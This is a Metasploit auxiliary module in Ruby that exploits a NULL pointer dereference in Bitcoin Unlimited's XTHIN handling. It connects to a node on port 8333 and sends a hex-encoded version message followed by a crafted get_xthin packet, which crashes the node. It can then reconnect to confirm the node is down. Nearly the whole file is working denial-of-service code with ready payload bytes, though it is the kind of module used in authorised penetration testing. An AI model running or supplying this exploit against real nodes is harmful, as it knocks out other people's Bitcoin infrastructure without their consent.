##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'


class MetasploitModule < Msf::Auxiliary
  Rank = ManualRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos


  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Bitcoin Unlimited Denial of Service',
      'Description'    => %q{
        This module exploits a NULL pointer deference
        in XTHIN Bitcoin Unlimited to cause a denial of service.
      },
      'Author'         => [
        'thecarterb',         # Metasploit Module
        '"Charlotte Gardner"' # Vulnerability discovery
       ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          # CVE should be coming soon according to https://bitcoinmagazine.com/articles/security-researcher-found-bug-knocked-out-bitcoin-unlimited/
          [ 'URL', 'https://bitcoinmagazine.com/articles/security-researcher-found-bug-knocked-out-bitcoin-unlimited/'],
          [ 'URL', 'https://github.com/BitcoinUnlimited/BitcoinUnlimited/pull/371'],
          [ 'URL', 'http://www.coindesk.com/code-bug-exploit-bitcoin-unlimited-nodes/'],
          [ 'URL', 'http://pastebin.com/xsZEnZJ3']  # Exploit code in python
        ],
      'Targets'        =>
        [
          [ 'Automatic Target', { }]
        ],
      'DefaultTarget'  => 0
      ))

      register_options(
        [
          OptBool.new("CHECKNODE", [true, "Check if the node is still up after the DoS", false]),
          Opt::RPORT(8333)
        ], self.class)
  end

  def checknode
    datastore["CHECKNODE"]
  end

  def unhexlify(msg)
    [msg].pack("H*")
  end

  def run

    # Buffer size
    buf_size = 1024

    # Version string
    str1 = "f9beb4d976657273696f6e00000000006600000023c22f307e110100000000000000000040dbc75800000000000000000000000000000000000000000000ffffad61bfae208d000000000000000000000000000000000000ffff0000000000002747310f6a3c90b9102f5361746f7368693a302e31332e312fbff9060000"
    version = unhexlify(str1)
    puts version

    # DoS string from PoC
    str2 = "f9beb4d96765745f787468696e00000050000000738a98c80200000000000000000000000000000000000000000000000000000000000000000000002200000000000000000000000000000000000000000000000000000000000000000000120000000000000001"
    get_xthin = unhexlify(str2)
    puts get_xthin

    # Connect to node with socket
    begin
      print_status("Trying to connect to #{rhost}:#{rport}")
      begin
        connect
      rescue Exception => e
        print_error("Unable to connect to #{rhost} (#{e})")  # Error case in which we weren't able to initially connect
        return
      end

      print_status('Sending required information')
      vprint_status('Sending version packet')
      sock.put(version)

      vprint_status('Sending dos packet')
      sock.put(get_xthin)
      disconnect

      if checknode  # Checks if the target is still up
        print_status('Checking for success')
        Rex.sleep(2)
        begin
          connect
        rescue ::Interrupt
          raise $!
        rescue ::Rex::ConnectionRefused
          print_good("Tango down (#{rhost} refused the connection)")
        else
          print_error('Dos unsuccessful.')
        ensure
          disconnect
        end
      end
    rescue Exception => e
      print_error(e)
    end
  end
end
